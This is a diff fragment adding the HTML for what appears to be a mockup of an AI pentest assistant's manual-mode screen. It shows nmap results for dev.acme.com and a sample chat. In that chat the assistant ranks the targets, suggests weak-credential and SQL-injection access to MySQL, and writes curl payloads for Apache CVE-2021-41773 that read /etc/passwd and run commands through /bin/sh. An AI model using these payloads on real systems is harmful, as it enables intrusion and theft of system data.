+          <div style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted);background:var(--bg-input);padding:8px 10px;border-radius:6px;margin-top:4px;border:1px solid var(--border-subtle)">
+            nmap -sS -sV -T3 -p 1-10000 dev.acme.com -oX -
+          </div>
+
+          <div style="margin-top:20px;padding-top:16px;border-top:1px solid var(--border-subtle)">
+            <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-dim);margin-bottom:8px">RESULTS — 8 open ports</div>
+            <table>
+              <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead>
+              <tbody>
+                <tr><td>22/tcp</td><td><span class="badge success">open</span></td><td>ssh</td><td>OpenSSH 8.2p1</td></tr>
+                <tr><td>80/tcp</td><td><span class="badge success">open</span></td><td>http</td><td>Apache/2.4.49</td></tr>
+                <tr><td>443/tcp</td><td><span class="badge success">open</span></td><td>https</td><td>Apache/2.4.49</td></tr>
+                <tr><td>3306/tcp</td><td><span class="badge success">open</span></td><td>mysql</td><td>MySQL 5.7.36</td></tr>
+                <tr><td>5432/tcp</td><td><span class="badge" style="background:rgba(245,158,11,0.15);color:var(--accent-amber)">filtered</span></td><td>postgresql</td><td>—</td></tr>
+                <tr><td>8080/tcp</td><td><span class="badge success">open</span></td><td>http-proxy</td><td>—</td></tr>
+                <tr><td>8443/tcp</td><td><span class="badge success">open</span></td><td>https-alt</td><td>—</td></tr>
+                <tr><td>9090/tcp</td><td><span class="badge success">open</span></td><td>http</td><td>Prometheus</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="manual-chat-panel">
+          <div style="padding:8px 14px;border-bottom:1px solid var(--border-subtle);font-size:12px;font-weight:600">Chat (advisor only)</div>
+          <div class="manual-messages">
+            <div class="msg user">What ports should I focus on from these nmap results?</div>
+            <div class="msg assistant">
+              Based on the scan results, I'd prioritize:
+              <br><br>
+              <strong>1. Port 80/443 (Apache 2.4.49)</strong> — This version has CVE-2021-41773, a critical path traversal + RCE vulnerability. Test this first.
+              <br><br>
+              <strong>2. Port 3306 (MySQL 5.7)</strong> — MySQL is directly exposed. Try connecting with default/weak credentials, or use the SQLi from old.acme.com to access it.
+              <br><br>
+              <strong>3. Port 9090 (Prometheus)</strong> — Often exposed without auth. Check for metrics endpoint at <code>/metrics</code> — may leak internal service names and configurations.
+              <br><br>
+              Port 8080 is worth investigating too — could be an admin panel or debug interface.
+            </div>
+            <div class="msg user">Can you write me a curl command to test the Apache path traversal?</div>
+            <div class="msg assistant">
+              Here's the payload for CVE-2021-41773:<br><br>
+              <code>curl -s --path-as-is "https://dev.acme.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"</code><br><br>
+              If you get back the contents of /etc/passwd, the server is vulnerable. To escalate to RCE via CGI:<br><br>
+              <code>curl --path-as-is -d 'echo; id' "https://dev.acme.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"</code><br><br>
+              Want me to explain the payload encoding?
+            </div>
+          </div>
+          <div class="manual-input">
+            <textarea class="manual-textarea" placeholder="Ask for advice..." rows="1"></textarea>
+            <button class="manual-send">↑</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="status-bar">
+        <div class="status-item"><div class="status-dot" style="background:var(--text-dim)"></div> Manual mode</div>
+        <div class="status-item">Qwen 3 235B</div>
+        <div class="status-item">8K tokens</div>
+        <div class="status-spacer"></div>
+        <div class="status-item">Chat only — no auto tool execution</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  function showTab(name) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.panel-screen').forEach(p => p.classList.remove('active'));
+    document.getElementById('tab-' + name).classList.add('active');
+    document.getElementById('panel-' + name).classList.add('active');
+  }
+  showTab('autopilot');
+</script>
+
+</body>
+</html>
